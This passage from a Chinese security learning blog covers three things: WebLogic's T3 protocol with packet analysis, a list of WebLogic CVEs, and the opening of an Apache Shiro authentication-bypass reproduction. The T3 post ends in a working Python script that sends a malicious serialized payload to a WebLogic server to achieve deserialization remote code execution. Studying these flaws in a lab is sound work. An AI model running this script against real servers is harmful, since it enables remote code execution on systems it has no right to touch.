class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Defines the JNDI context factory.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY = <span class="string">"weblogic.jndi.WLInitialContextFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Client</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InitialContext ic = getInitialContext(<span class="string">"t3://192.168.116.140:7001"</span>);</span><br><span class="line">            Hello obj = (Hello) ic.lookup(<span class="string">"HelloServer"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Successfully connected to HelloServer , call sayHello() : "</span>+ obj.sayHello());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            System.err.println(<span class="string">"An exception occurred: "</span> + ex.getMessage());</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改pom.xml：</p><figure class="highlight xml"><figcaption><span>pom.xml</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>Pocs.WebLogic.t3<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>t3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">useUniqueVersions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">useUniqueVersions</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">classpathPrefix</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">classpathPrefix</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>Pocs.WebLogic.t3.Server<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>mvn package生成jar包，将jar包放在域的lib下</p><p><img src="/imgs/image-20200721162706621.png" alt="image-20200721162706621"></p><p>然后在WebLogic console下新增一个启动类，类名要写全名，选择adminserver</p><p><img src="/imgs/image-20200721162935046.png" alt="image-20200721162935046"></p><p>重启weblogic（可以先不重启看下有没有，我忘了到底重启没）找到JNDI</p><p><img src="/imgs/image-20200721163057420.png" alt="image-20200721163057420"></p><p>可以看到AdminServer下多了HelloServer，这时候证明HelloServer在Weblogic的JNDI注册成功</p><p><img src="/imgs/image-20200721163206880.png" alt="image-20200721163206880"></p><p>这时可以执行Client.java，客户端成功调用HelloServer服务。如果报错的话，提示没有WLInitialContextFactory类，因为客户端调用了weblogic.jndi.WLInitialContextFactory，所以要加下weblogic的jar，可以把weblogic的wlserver/server/lib下的jar包拷贝出来放到一个目录然后加到Libraries下，我用的是之前某次远程分析时候的jar，版本是10.3.6。</p><p><img src="/imgs/image-20200721163750014.png" alt="image-20200721163750014"></p><p>至此，我们成功利用调用了weblogic的T3下的服务。</p><h2 id="0x03-WebLogic-T3和反序列化的关系？"><a href="#0x03-WebLogic-T3和反序列化的关系？" class="headerlink" title="0x03 WebLogic T3和反序列化的关系？"></a>0x03 WebLogic T3和反序列化的关系？</h2><p>学习RMI的时候我们已经了解<a href="/2020/06/14/Java%20RMI/#0x03-扩展">RMI的原理</a>：</p><ol><li>将可以远程调用的对象进行序列化，然后绑定到RMI Server（被调方，运行者）中作为存根（stub）</li><li>RMI Client 会先去下载stub<strong>反序列化</strong>然后发起client调用，RMI 底层（RMI Interface Layer &amp; Transport Layer）会讲请求参数封装发送到RMI Server </li><li>RMI Server 接收到封装的参数，传递给骨架（skeleton），由桩解析参数并且以参数调用对应的存根（stub）方法。</li><li>存根方法在RMI Server执行完毕之后，返回结果将被RMI底层封装并传输给RMI Client（也就是主调方，调用者）</li></ol><p>可以看出：RMI是基于序列化和反序列化的，远程对象在进行注册时，序列化作为存根，客户端调用的时候会把<strong>序列化后的对象进行反序列化再调用</strong>，T3一样的道理，所以同样会在客户端调用服务的时候进行反序列化获取对象。到这一步搞懂了为什么webLogic T3会被爆出反序列化漏洞。</p><img src="/imgs/image-20200609170552480.png" alt="image-20200609170552480" style="zoom:67%;" /><h2 id="0x04-怎么构造payload并通过T3执行命令？"><a href="#0x04-怎么构造payload并通过T3执行命令？" class="headerlink" title="0x04 怎么构造payload并通过T3执行命令？"></a>0x04 怎么构造payload并通过T3执行命令？</h2><p>构造恶意数据并发送想要先分析如何与T3建立连接并发送包。</p><h3 id="分析T3包"><a href="#分析T3包" class="headerlink" title="分析T3包"></a>分析T3包</h3><p>构造T3包，首先分析流量，执行client.java，用wireshark进行抓包，并跟踪TCP流，下图是以ASCII码形式显示</p><p><img src="/imgs/image-20200721203221667.png" alt="image-20200721203221667"></p><p>红色是本地（192.168.116.1）发送的包，蓝色是接收的来自服务器（192.168.116.140）的包，我们一一分析</p><p>首先和目标服务器建立连接，然后本地发送T3协议头，由上图观察可以注意到这里结尾是两个\n</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t3 10.3.6\nAS:255\nHL:19\n\n</span><br></pre></td></tr></table></figure><p>服务器监听，收到请求并发送数据，我们可以得到服务器的版本12.2.1.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HELO:12.2.1.4.false</span><br><span class="line">AS:2048</span><br><span class="line">HL:19</span><br><span class="line">MS:10000000</span><br><span class="line">PN:DOMAIN</span><br></pre></td></tr></table></figure><p>分析到这里我不是很懂后面部分是怎么进行，参考了下<a href="http://drops.xmd5.com/static/drops/web-13470.html" target="_blank" rel="noopener">修复weblogic的JAVA反序列化漏洞的多种方法#对JAVA序列化数据进行解析</a>，通过<code>ac ed 00 05</code>可以筛选出请求的反序列化部分</p><p><img src="/imgs/image-20200721212800433.png" alt="image-20200721212800433"></p><p>自己也跟着实践了下，用之前学习Java序列化的例子来构造了一个序列化数据，发现确实是以<code>aced0005</code>开始</p><p><img src="/imgs/image-20200721214315503.png" alt="image-20200721214315503"></p><p><img src="/imgs/image-20200721214719132.png" alt="image-20200721214719132"></p><p>接着继续跟着学习，发现优秀的表哥已经把这个分析的很明白了</p><p>分析下图发送的包由三部分构成：</p><ol><li>包第一部分-由包的大小和其他数据组成。整个包的大小是前四个字节<code>00 00 02 7c</code></li><li>第二部分以<code>ac ed 00 05</code>开始的序列化部分</li><li>第三部分以<code>ac ed 00 05</code>开始的序列化部分</li></ol><p><img src="/imgs/image-20200721215748210.png" alt="image-20200721215748210"></p><h3 id="构造T3包"><a href="#构造T3包" class="headerlink" title="构造T3包"></a>构造T3包</h3><p>构造包，表哥给了两种方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种生成方式为，将前文所述的weblogic发送的JAVA序列化数据的第二到三部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。</span><br><span class="line">第二种生成方式为，将前文所述的weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。</span><br></pre></td></tr></table></figure><p>为了简单，我选择第二种方法进行构造，即将 <strong>包第一部分-由包的大小和其他数据组成</strong> 和 <strong>恶意序列化数据</strong> 拼接</p><p>参考脚本，经过上面的分析，可以总结下流程</p><ol><li>用socket建立TCP连接</li><li>发送T3协议头</li><li>将恶意数据按照第二种方法拼接在第一部分之后</li><li>获取整个包的长度，然后替换第一部分的前四个字节</li><li>最后发送数据</li></ol><p>我们便可以构造出通用的T3包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 适用于python2和python3</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(ip, port, file)</span>:</span></span><br><span class="line">    t3_header = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span></span><br><span class="line">    host = (ip, int(port))</span><br><span class="line">    <span class="comment"># socket connect</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">15</span>)</span><br><span class="line">    sock.connect(host)</span><br><span class="line">    <span class="comment"># send t3 header</span></span><br><span class="line">    sock.send(t3_header.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    resp1 = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># first part</span></span><br><span class="line">    data1 = <span class="string">'016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000'</span></span><br><span class="line">    <span class="comment"># second part, BIN -&gt; HEX</span></span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        payload = binascii.b2a_hex(f.read()).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="comment"># join</span></span><br><span class="line">    data = data1 + payload</span><br><span class="line">    <span class="comment"># get lenth and join</span></span><br><span class="line">    data = <span class="string">'%s%s'</span> % (<span class="string">'&#123;:08x&#125;'</span>.format(len(data) // <span class="number">2</span> + <span class="number">4</span>), data)</span><br><span class="line">    <span class="comment"># a2b: HEX -&gt; BIN</span></span><br><span class="line">    sock.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(<span class="string">'192.168.116.132'</span>,<span class="string">'7001'</span>,<span class="string">'poc.ser'</span>)</span><br></pre></td></tr></table></figure><h2 id="0x05-参考链接："><a href="#0x05-参考链接：" class="headerlink" title="0x05 参考链接："></a>0x05 参考链接：</h2><p><a href="https://docs.oracle.com/cd/E11035_01/wls100/client/t3.html" target="_blank" rel="noopener">Developing T3 Clients</a></p><p><a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI150" target="_blank" rel="noopener">How to Implement WebLogic RMI</a></p><p><a href="https://blog.csdn.net/natureice/article/details/6104885" target="_blank" rel="noopener">关于引用WebLogic.jar时遇到NoClassDefFoundError问题的解决方法</a></p><p><a href="https://blog.csdn.net/u012478275/article/details/99624506" target="_blank" rel="noopener">wireshark解析TCP的几种状态</a></p><p><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#commons" target="_blank" rel="noopener">What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability.</a></p><p><a href="http://drops.xmd5.com/static/drops/web-13470.html" target="_blank" rel="noopener">修复weblogic的JAVA反序列化漏洞的多种方法#对JAVA序列化数据进行解析</a></p><p><a href="https://blog.csdn.net/mafucan/article/details/106605064" target="_blank" rel="noopener">Java反序列化个人总结</a></p><p><a href="https://docs.python.org/zh-cn/2.7/library/binascii.html" target="_blank" rel="noopener">二进制和 ASCII 码互转</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> WebLogic </category>
          
          <category> T3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
            <tag> T3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic系列漏洞学习</title>
      <link href="2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/07/20/WebLogic%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>为了方便学习，总结了下WebLogic历年来的漏洞，接下来将会用漫长的时间来分析这些漏洞并进行总结。</p><p><img src="/imgs/WebLogic.png" alt="WebLogic"></p><ol><li><p>T3 Deserialize RCE</p><p>CVE-2015-4852</p><p>CVE-2016-0638</p><p>CVE-2016-3510</p><p>CVE-2020-2801</p><p>CVE-2020-2884</p><p>JRMI</p><p>​        CVE-2017-3248<br>​        CVE-2018-2628<br>​        CVE-2018-2893<br>​        CVE-2018-3245<br>IIOP Deserialize RCE<br>​        CVE-2020-2551</p><p>JNDI</p><p>​        CVE-2020-14645<br>T3 Coherence Deserialize RCE<br>​        CVE-2020-2555</p><p>​        CVE-2020-2883</p><p>​        CVE-2020-2915</p></li><li><p>wls-wsat XML Decoded  Deserialize RCE</p><p>CVE-2017-3506<br>CVE-2017-10271<br>CVE-2019-2725<br>CVE-2019-2729</p></li><li><p>File Upload</p><p>CVE-2018-2894<br>CVE-2019-2618</p></li><li><p>SSRF</p><p>CVE-2014-4210</p></li><li><p>XXE（<a href="https://paper.seebug.org/906/）" target="_blank" rel="noopener">https://paper.seebug.org/906/）</a></p><p>CVE-2019-2647</p><p>CVE-2019-2648</p><p>CVE-2019-2649</p><p>CVE-2019-2650</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> WebLogic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebLogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache Shiro CVE-2020-1957&amp;CVE-2020-11989身份认证绕过漏洞分析</title>
      <link href="2020/07/10/CVE-2020-1957-CVE-2020-11989/"/>
      <url>2020/07/10/CVE-2020-1957-CVE-2020-11989/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VUL = [<span class="string">"CVE-2020-1957&amp;CVE-2020-11989"</span>]</span><br><span class="line">VUL_NAME = [<span class="string">"Apahce Shiro权限绕过漏洞"</span>]</span><br><span class="line">TYPE = [<span class="string">"Permissions Bypass"</span>]</span><br><span class="line">DESCRIPTION = <span class="string">'''2020年3月23号，Shiro开发者Brian Demers在用户社区发表帖子，提醒shiro用户进行安全更新，本次更新进行了三个修复，其中就包括了对编号为CVE-2020-1957的Shrio授权绕过漏洞的修复。SHIRO-682的修复了spring框架下uri = uri + ‘/’ 绕过Shiro防护的问题。然后下面的描述则清晰得描述了造成改错误的原因。在Spring web项目中，请求URI /resource/menus和/resource/menus/ 都可以访问到服务器的资源。但在Shiro中的URL路径表达式pathPattern可以正确匹配/resource/menus，但不能正确匹配/resource/menus/，导致过滤链无法正确匹配，从而绕过Shiro的防护机制。'''</span></span><br><span class="line">IMPACT = [<span class="string">"Apahce Shiro &lt; 1.5.3"</span>]</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>首先搭建漏洞环境。看了网上方法，利用Spring Boot + shiro搭建。</p><p>先看了大家都参考的博客 <a href="https://segmentfault.com/a/1190000019440231" target="_blank" rel="noopener">https://segmentfault.com/a/1190000019440231</a> ，发现自己其实创建Spring项目就看不懂，所以先向郭老师请教了下，远程协助我建了项目，又发了我一篇文章 <a href="https://developer.aliyun.com/article/695233" target="_blank" rel="noopener">https://developer.aliyun.com/article/695233</a> ，总算搞懂怎么创建了，感谢郭老师的耐心:heart:。</p><p>创建项目，new-project，进入界面，选择Spring Initializr，这里服务填写阿里的下载更快点 <a href="https://start.aliyun.com/" target="_blank" rel="noopener">https://start.aliyun.com/</a> ，点击next</p><p><img src="/imgs/image-20200713145444783.png" alt="image-20200713145444783"></p><p>填写、选择项目元数据，next</p><p><img src="/imgs/image-20200713145727086.png" alt="image-20200713145727086"></p><p>选择Spring Web依赖，点击next，选择项目目录点击finish即创建完成</p><p><img src="/imgs/image-20200713150325825.png" alt="image-20200713150325825"></p><p>等待下载完成，在pom.xml添加Shiro依赖，这里shiro版本我选的1.4.0，只要在1.5.2以下都可以</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>创建完成后，发现项目下自动生成三个文件：src/main/java-ShiroApplication.class程序入口；src/main/resources-配置文件-application.properties；src/test/java-ShiroApplicationTests.class测试程序</p><p><img src="/imgs/image-20200713151229419.png" alt="image-20200713151229419"></p><p>接下来配置shiro过滤规则</p><p>创建Realm，实现认证：</p><figure class="highlight java"><figcaption><span>MyRealm.class</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.debug.shiro.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthorizationInfo <span class="title">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principals)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AuthenticationInfo <span class="title">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException </span>&#123;</span><br><span class="line">        String username = (String) token.getPrincipal();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">"javaboy"</span>.equals(username)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnknownAccountException(<span class="string">"账户不存在!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SimpleAuthenticationInfo(username, <span class="string">"123"</span>, getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置shiro：</p><figure class="highlight java"><figcaption><span>ShiroConfig.class</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.debug.shiro.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.debug.shiro.bean.MyRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.LinkedHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function">MyRealm <span class="title">myRealm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MyRealm();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    org.apache.shiro.mgt.<span class="function">SecurityManager <span class="title">securityManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        DefaultWebSecurityManager manager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line">        manager.setRealm(myRealm());</span><br><span class="line">        <span class="keyword">return</span> manager;</span><br><span class="line">    